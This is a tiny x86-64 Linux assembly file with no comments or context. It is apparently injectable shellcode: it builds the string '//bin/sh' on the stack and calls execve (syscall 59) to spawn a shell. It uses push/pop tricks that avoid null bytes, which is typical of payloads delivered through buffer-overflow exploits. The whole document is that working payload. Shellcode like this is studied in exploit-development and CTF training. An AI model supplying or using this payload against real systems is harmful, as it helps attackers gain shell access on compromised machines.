
global _start
section .text
_start:
    push 59
    pop rax
    cdq
    push rdx
    mov rbx,0x68732f6e69622f2f
    push rbx
    push rsp
    pop rdi
    push rdx
    push rdi
    push rsp
    pop rsi
    syscall
